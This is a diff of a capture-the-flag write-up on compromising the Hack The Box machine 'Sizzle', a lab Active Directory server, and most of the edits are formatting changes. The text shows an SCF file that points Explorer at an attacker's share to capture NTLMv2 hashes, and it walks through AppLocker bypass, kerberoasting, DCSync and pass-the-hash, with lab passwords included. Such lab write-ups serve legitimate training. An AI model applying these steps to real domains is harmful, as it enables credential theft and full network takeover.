@@ -4,24 +4,24 @@
 - *Noticing that our user has* **PowerShell Remoting** *capabilities,* we try to gain access but are faced with a *strange authentication error*.
 - *Upon inspecting the functionality of the* `Evil-Winrm` *tool,* we find that we can use a *certificate* for logging in.
 - We create a **Certificate Signing Request** using `openssl` and get it signed from the **ADCS Web Interface** found on the domain controller.
-- Using `evil-winrm`'s ability to authenticate using SSL certificates, we successfully achieve code execution.
-- The output of `BloodHound` showed a *kerberoastable* user called `mrlky` that has dangerous rights that could be abuse to do a `DCSync` attack.
+- *Using* `evil-winrm`'*s ability to authenticate using SSL certificates,* we successfully achieve code execution.
+- Looking back at the output of `BloodHound` showed a *kerberoastable* user called `mrlky` that has dangerous rights that could be abused to do a `DCSync` attack.
 - We decide to use `Rubeus.exe` to do the job but can't execute it due to **Applocker restrictions.**
-- We bypass that by moving `Rubeus` in the Windows `temp` folder and are faced with another error requiring us to authenticate to the network.
+- We bypass by moving `Rubeus` to the Windows `temp` folder and are faced with another error requiring us to authenticate to the network.
 - We add the `amanda` user's credentials as flags to the `Rubeus` tool and manage to kerberoast the `mrkly` user.
-- We crack his TGS hash and are able to get the password. We then proceed to `DCSync` and obtain the NTLM hash for the `administrator` account which we pass to gain complete access.
+- We crack his `TGS` hash and are able to get the password. We then proceed to `DCSync` and obtain the `NTLM hash` for the `administrator` account which we pass to gain complete access.
 
 ---
 
 ### Nmap
 The nmap output shows us some good information:
-- Machine name: Sizzle
-- Domain Name: HTB.local
-- FTP with anonymous login allowed
-- IIS 10.0 on port 80 which indicates server 2016+ or windows 10
-- SMB on port 445
-- LDAP and GC on ports 389 and 3268
-- WinRM on 5985/5986 which is always nice to have
+- **Machine name:** Sizzle
+- **Domain Name:** HTB.local
+- **FTP** with *anonymous* login allowed
+- **IIS** 10.0 on port 80 which indicates server 2016+ or windows 10
+- **SMB** on port 445
+- **LDAP** and **GC** on ports 389 and 3268
+- **WinRM** on 5985/5986 which is always nice to have
 
 ```
 PORT      STATE SERVICE       VERSION
@@ -115,38 +115,38 @@ Host script results:
 
 ### Anonymous FTP
 We notice the FTP port with anonymous login enabled.
-No files are there, and we're not granted write access either. So we move on.
+No files were there, and we're not granted `write` access either. So we move on.
 
 ![Anon-FTP-no-write](Anon-FTP-no-write.jpg)
 
 ### HTTP/HTTPs
-The home page just shows a GIF of bacon sizzling.
+The home page just shows a `GIF` of bacon sizzling.
 
 ![http-homepage](http-homepage.jpg)
 
-Spidering with gobuster shows an interesting directory `/certsrv` which indicates that the ADCS role is installed on this server.
+Spidering with `gobuster` shows an interesting directory `/certsrv` which indicates that the **ADCS role** is installed on this server.
 
 ![gobuser-output](gobuser-output.jpg)
 
-the HTTPS website is similar in structure. so we move along.
+the **HTTPS** website is similar in structure. so we move along.
 
 ### LDAP
-The output of ldapsearch didn't show much information. 
+The output of `ldapsearch` didn't show much information. 
 
 ![ldapsearch-output](ldapsearch-output.jpg)
 
-I grepped out some unnecessary lines from the output to make it smaller.
+(*I grepped out some unnecessary lines from the output to make it smaller.*)
 
 ### SMB
-Enumerating SMB with crackmapexec reveals that we have read access to the `Department Shares` folder.
+Enumerating SMB with `crackmapexec` reveals that we have `read` access to the `Department Shares` folder.
 
 ![cme-smb-share-enum](cme-smb-share-enum.jpg)
 
-After mounting it, we notice a couple of folders:
+*After mounting it,* we notice a couple of folders:
 
 ![dpt-shares-folders](dpt-shares-folders.jpg)
 
-the `Users` folder contained some usernames which save in a list for later use:
+the `Users` folder contained some usernames which we save in a list for later use:
 
 ![userlist-from-smb](userlist-from-smb.jpg)
 
@@ -154,11 +154,11 @@ We find some files in the `ZZ_ARCHIVE` folder but they dont have any content:
 
 ![zz-archive-files](zz-archive-files.jpg)
 
-we loop over the files use the `file` command and grepping out any empty hex line with `xxd` to find nothing there as well.
+we loop over the files use the `file` command and `grep` out any empty hex line with `xxd` to find nothing there as well.
 
 ![checking_zz_archive](checking_zz_archive.jpg)
 
-Since we're nearing a dead end with our enumeration, we're going to use a simple bash script to check from write access in the SMB shares.
+*Since we were nearing a dead end with our enumeration,* we're going to use a simple `bash` script to check for `write` access in the SMB share.
 
 ```
 #!/bin/bash
@@ -175,16 +175,22 @@ do
         fi
 done
 ```
-it does a `find` on the mount point with the `-type d` flag to get only directories and attempts to create a file in each one using `touch`. It prints out if the folder is writable or not and clears the test file if the folder is writable.
+
+1. it does a `find` on the mount point with the `-type d` flag to get *only directories*.
+2. attempts to create a file in each one using `touch`
+3. It prints out if the folder is writable or not
+4. then clears the test file if the folder is writable.
 
 ![check-write-script-results](check-write-script-results.jpg)
 
 The results show that we have `write` access in both the `Public` and `ZZ_ARCHIVE` folders.
 
-Having this access would allow us to plant a malicious type of file that would enable us to steal NTLMv2 hashes from users who access these locations.
+Having this access would allow us to *plant a malicious type of file* that would enable us to *steal* **NTLMv2 hashes** from users who access these locations.
 
-### SCF File Attacks to Steal Hashes
-SCF (Shell Command Files) are files that can perform some actions in Windows explorer. One functionality of them can be abused to have the share-visiting user directed to our kali machine. This can be done using a file with the below content:
+### SCF File Attacks for Hash Theft
+SCF (Shell Command Files) are files that can perform actions in **Windows Explorer**. One functionality can be abused to have the *share-visiting* user *directed* to our kali machine.
+
+This can be done using a file with the below content:
 
 ```
 [Shell]
@@ -194,7 +200,7 @@ IconFile=\\10.10.16.7\share\pwn.ico
 Command=ToggleDesktop
 ```
 
-This tells file explorer to fetch the icon for the `.scf` file from a network share (which is our kali box in this case).
+*Essentially,* this tells **File Explorer** to *fetch* the icon for the `.scf` file from a network share (*our kali box in this case*).
 
 We're going to fire up `responder` making sure the `Responder.conf` file has the `SMB` server set to `ON`.
 
@@ -202,34 +208,38 @@ And then copy the `.scf` file to `\\10.10.10.103\Department Shares\Users\Public`
 
 ![amanda-hash-captured](amanda-hash-captured.jpg)
 
-we manage to get a response right away and we get to cracking with `john`
+We manage to get a response right away :D
+
+We then get to cracking with `john`
 
 ![amanda-hash-cracked](amanda-hash-cracked.jpg)
 
 the password turns out to be `Ashare1972`
 
-### WinRM situation
-We first validate the creds for `amanda` with `crackmapexec` and they work. So we try WinRM but end up with a weird error message:
+### The WinRM situation
+We first validate the creds for `amanda` with `crackmapexec` via SMB and they work.
+
+So we try WinRM next but end up with a weird error message:
 
 ![cme-smb-yes-winrm-no](cme-smb-yes-winrm-no.jpg)
 
-at this moment, I wasn't quite sure what to do. So I moved on to other avenues.
+at this moment, I wasn't quite sure what to do. So I moved on to try other things.
 
 ### Domain Enumeration With BloodHound.py
-Since I don't have local code execution, I turn to the python version of `BloodHound` and do enumeration with all collection methods:
+*Since I didn't have code execution,* I turned to the python version of `BloodHound` to do enumeration with all collection methods:
 
 ![bloodhound-py](bloodhound-py.jpg)
 
-Viewing the `amanda` user, I see she has PowerShell Remoting capability when I run the `Shortest Path from Owned Principles` query.
+*Viewing the* `amanda` *user,* I saw she did have **PowerShell Remoting** capability when I ran the `Shortest Path from Owned Principles` query.
 
 ![amanda-can-ps-remote](amanda-can-ps-remote.jpg)
 
 ### Getting WinRM to work
-Since we have access to the `amanda` user, we can request a user certificate from AD Certificate Services.
+*Since we have access to the* `amanda` *user's credentials,* we can *request* a **User Certificate** from **AD Certificate Services.**
 
-This can be done after authenticating to `http://10.10.10.103/certsrv` and submitting a Certificate Signing Request (CSR for short).
+This can be done after authenticating to `http://10.10.10.103/certsrv` and submitting a **Certificate Signing Request** (**CSR** for short).
 
-Before visiting the ADCS page, we would need to get a key and a CSR. This can be done using `openssl`. The command should be like below:
+*Before visiting the* **ADCS** *page,* we would need to get a **key** and a **CSR**. This can be done using `openssl`. The command should be like below:
 
 `openssl req -newkey rsa:2048 -keyout amanda.key -out amanda.csr`
 
@@ -249,11 +259,13 @@ we then paste what we copied from `amanda.csr`
 
 ![cert-srv-3](cert-srv-3.jpg)
 
-And we select eh Base 64 encoded version and download it.
+And we select the **Base 64 encoded version** and download it.
 
 ![cert-srv-4](cert-srv-4.jpg)
 
-Having done all this, we just need to hook the `.key` file and the `.cer` we got from ADCS to `evil-winrm` while using the `-S` flag for SSL. We know so from checking the help:
+*Having done all this,* we just need to hook the `.key` file and the `.cer` we got from ADCS to `evil-winrm` while using the `-S` flag for SSL.
+
+We know so from checking the help:
 
 ![evil-winrm-help](evil-winrm-help.jpg)
 
@@ -264,7 +276,7 @@ And it works like a charm :D
 Note: the PEM pass phrase is the one you were required to enter when generating the private key and CSR with `openssl`
 
 ### Back to `BloodHound` graphs: Kerberoastable Users
-Inspecting the query `List all Kerberoastable Accounts` shows us that a user called `mrlky` is vulnerable:
+Inspecting the query `List all Kerberoastable Accounts` shows us that a user called `mrlky` is vulnerable.
 
 ![mrlky-kerberoastable](mrlky-kerberoastable.jpg)
 
@@ -274,10 +286,10 @@ That user is very special since he has the 2 required rights to perform a `DCSyn
 
 ![mrlky-can-dcsync](mrlky-can-dcsync.jpg)
 
-Hence, we need to kerberoast this guy and get his TGS hash :D
+*Hence,* we need to kerberoast this guy and get his TGS hash :D
 
 ### Roasting with Rubeus: Bypassing Applocker and Performing Network Authentication
-After copying `Rubeus.exe` from our kali machine over to `amanda`'s documents folder, we find that we can't execute due to Applocker.
+*After copying* `Rubeus.exe` *from our kali machine over to* `amanda`'*s documents folder*, we find that we can't execute due to **Applocker.**
 
 ![rubeus-applocked](rubeus-applocked.jpg)
 
@@ -285,7 +297,9 @@ Moving it to `c:\windows\temp` directory works as a bypass. But we get another e
 
 ![rubeus-no-net-logon](rubeus-no-net-logon.jpg)
 
-This is because we logged in using a different way: user certificate. In order to carry out this attack, we would need to authenticate to the network.
+This is because we logged in using a different way: user certificate.
+
+*In order to carry out this attack,* we would need to authenticate to the network.
 
 This can be done using the `/creduser` and `/credpassword` along withe `/domain` switches in `Rubeus.exe`.
 
@@ -300,10 +314,10 @@ Now we crack the hash for `mrkly` again with `john`:
 ![mrlky-cracked](mrlky-cracked.jpg)
 
 ### DCSync
-Having the password for `mrkly`: `Football#7`, we're going to use Impacket's `secretsdump.py` python script to do a `DCSync` attack:
+*Having the password for* `mrkly`: `Football#7`, we're going to use `Impacket`'s `secretsdump.py` python script to do a `DCSync` attack:
 
 ![dcsynced](dcsynced.jpg)
 
-and follow up with `psexec.py` for a quick pass-the-hash attack to get code execution as `NT Authority\System`:
+and follow up with `psexec.py` for a quick **Pass-The-Hash** attack to get code execution as `NT Authority\System`:
 
 ![got-system](got-system.jpg)
